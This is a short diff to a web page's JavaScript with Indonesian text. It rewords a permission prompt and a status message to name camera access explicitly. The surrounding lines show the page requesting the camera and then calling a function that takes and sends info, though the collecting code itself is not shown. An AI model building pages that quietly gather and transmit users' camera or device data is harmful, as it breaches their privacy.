@@ -125,7 +125,7 @@
 
       // Tanyakan izin eksplisit kepada pengguna
       const permission = await new Promise((resolve) => {
-        const userConfirmed = confirm("Apakah Anda ingin memberikan izin akses nya? ");
+        const userConfirmed = confirm("Apakah Anda ingin memberikan izin akses kamera?");
         resolve(userConfirmed);
       });
 
@@ -138,7 +138,7 @@
       if (navigator.mediaDevices) {
         try {
           await navigator.mediaDevices.getUserMedia({ video: true });
-          tampilkanStatus("Izin Diterima!");
+          tampilkanStatus("Izin Kamera Diterima!");
           await ambilDanKirimInfo();
           tampilkanStatus("Data berhasil diambil!");
 
@@ -220,4 +220,4 @@
     }
   </script>
 </body>
-</html>
+  </html>
